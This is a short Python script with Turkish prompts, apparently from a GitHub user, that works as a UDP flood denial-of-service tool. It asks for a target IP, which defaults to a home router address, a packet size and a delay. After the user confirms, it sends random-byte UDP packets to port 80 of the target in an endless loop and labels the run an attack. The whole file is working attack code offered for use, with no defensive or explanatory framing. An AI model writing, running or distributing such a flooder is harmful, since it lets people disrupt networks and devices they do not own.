import socket
import time
import random

import colorama
from colorama import Fore, Style

colorama.init()

RED = Fore.RED
GREEN = Fore.GREEN
ORANGE = Fore.LIGHTYELLOW_EX
YELLOW = Fore.YELLOW
PURPLE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Style.RESET_ALL

print("github.com/memirhan\n")

targetIp = input(f"Hedef IP adresini giriniz {GREEN}(default 192.168.1.1){RESET}: ")
packetByte = int(input(f"Gönderilecek her bir paketin boyutunu giriniz {GREEN}(max 4096){RESET}: "))
timeOut = input("Timeout değeri veriniz (örnek 0.001): ").replace(",", ".")
timeOut = float(timeOut)
targetPort = 80

resultTime = 0

while True:
    if packetByte <= 4096:
        if not targetIp:
            targetIp = "192.168.1.1"

        print("------------------------------------")
        print(f"{ORANGE}Modem IP Adresi{RESET}: ", targetIp)
        print("------------------------------------")
        print(f"{ORANGE}Her bir paketin boyutu:  {RESET}: ", packetByte)
        print("------------------------------------\n")

        packet = random._urandom(packetByte)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sendPacket = 0
        clock = 0

        attackConfirm = input("Atak Başlatılsınmı? (evet/hayır): ")
        if attackConfirm == "evet":
            try:
                print(f"\n{RED}Saldırı Başlatıldıs...\n")
                attackStartTime = time.time()

                counter = 0

                while True:
                    sock.sendto(packet, (targetIp, targetPort))
                    sendPacket += 1
                    time.sleep(timeOut)

                    attackFinishTime = time.time()
                    resultTime = int(attackFinishTime - attackStartTime)

                    counter += timeOut

                    if counter >= 10:
                        print(f"{CYAN}Geçen süre: {resultTime} saniye{RESET}")
                        counter = 0

            except KeyboardInterrupt:
                print(f"\n{YELLOW}Saldırı durduruldu.{RESET}")

            except OSError:
                print(f"{RED}Bir hata oluştu. Saldırı durduruldu.{RESET}")
                break

            except ValueError:
                print("??????????????????????????????????")

        elif attackConfirm == "hayır":
            print("Atak sonlandırılıyor...")
            break

        else:
            print("Geçerli bir seçim yapınız (evet/hayır): ")

    else:
        print(f"\n{RED}Hata{RESET}\n")
        packetByte = int(input(f"Gönderilecek paketin boyutunu küçültünüz {GREEN}(max 4096){RESET}: "))
        print(" ")
